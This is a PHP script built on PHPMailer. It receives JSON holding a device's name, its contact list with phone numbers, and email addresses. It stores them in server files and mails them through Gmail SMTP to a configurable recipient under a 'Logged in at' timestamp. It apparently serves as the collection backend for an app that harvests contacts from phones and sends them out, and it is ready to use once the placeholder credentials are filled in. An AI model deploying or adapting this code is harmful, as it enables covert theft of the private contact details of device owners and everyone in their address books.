<?php
  require 'phpmailer/PHPMailerAutoload.php';
  $json = file_get_contents('php://input');
  $obj = json_decode($json,true);
  $contactsj = $obj['contacts'];
  $emails = $obj['emails'];
  $account="Sender Email Here";
  $password="Sender Password Here";
  $to="Reciever Email Here";
  $from="Add a from(Sender Email)";
  $from_name="Your Name Here";
  include("phpmailer/class.phpmailer.php");
  $mail = new PHPMailer();
  $mail->IsSMTP();
  $mail->CharSet = 'UTF-8';
  $mail->Host = "smtp.gmail.com";
  $mail->SMTPAuth= true;
  $mail->Port = 465; // Or 587
  $mail->Username= $account;
  $mail->Password= $password;
  $mail->SMTPSecure = 'ssl';
  $mail->From = $from;
  $mail->FromName= $from_name;
  $mail->isHTML(true);
  $mail->addAddress($to);
  $filename="files/data.txt";
  $contacts = "files/contacts.txt";
  $myfile = fopen($filename, "a") or die("Unable to open file! Make sure the file exists.");
  $contactfile = fopen($contacts, "w") or die("Unable to open file! Make sure the file exists.");
  $t=time();
  $allContacts = "";
  foreach ($contactsj as $key => $value) 
  {
    $allContacts = $allContacts.$key." : \n";
    foreach ($value as $phone) 
    {
      $allContacts = $allContacts."\t".$phone."\n";
    }
  }
  $allContacts = $allContacts."Emails: \n";
  foreach($emails as $email) 
  {
    $allContacts = $allContacts."\t".$email."\n";
  }
  $str="<strong>Logged in at: ".date("g:i:s a",$t)." on ".date("Y-m-d\n</strong>");
  $msg = $str.$allContacts;
  $msg = nl2br($msg);
  $mail->Body = $msg;
  $subject = $obj['Device'];
  $mail->Subject = $subject;
  echo "Contacts sent Successfully... ";
  if(!$mail->send())
  {
    echo "Mailer Error: " . $mail->ErrorInfo;
  }
  else
  {
    echo "E-Mail has been sent.";
  }
?> 